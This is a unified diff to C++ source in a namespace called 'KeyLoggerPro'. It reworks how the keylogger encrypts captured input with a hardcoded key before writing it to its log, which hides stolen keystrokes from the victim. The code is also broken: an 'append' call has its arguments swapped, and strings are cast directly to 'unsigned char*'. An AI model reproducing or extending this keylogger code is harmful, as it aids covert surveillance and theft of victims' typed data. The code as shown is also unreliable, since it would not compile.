@@ -60,10 +60,14 @@ namespace KeyLoggerPro {
         return "";
 
       std::string data = "[" + bDateTime.dateToString() + "]\n" + _inf + "\n";
-      Encryption safeEncrypt;
+      std::string key = "MNmtceICrTlqSCxJhWgAcPpPKGPQVxtlWsSsElDCdQegutNVwUDFpft";
+      std::string _enc_data(data.size(), '\0');
+      int re = data.size() % 8;
+      key.append('-', re);
 
-      safeEncrypt.encrypt(data, 1000, safeEncrypt.CBC);
-      log << data;
+      Encryption _safe_enc((unsigned char*)key, key.size());
+      _safe_enc.encrypt((unsigned char*)data.c_str(), (unsigned char*)_enc_data, data.size(), Encryption::CBC);
+      log << _enc_data;
 
       return path(path.begin()+path.find_last_of('\\'), path.end());
     }
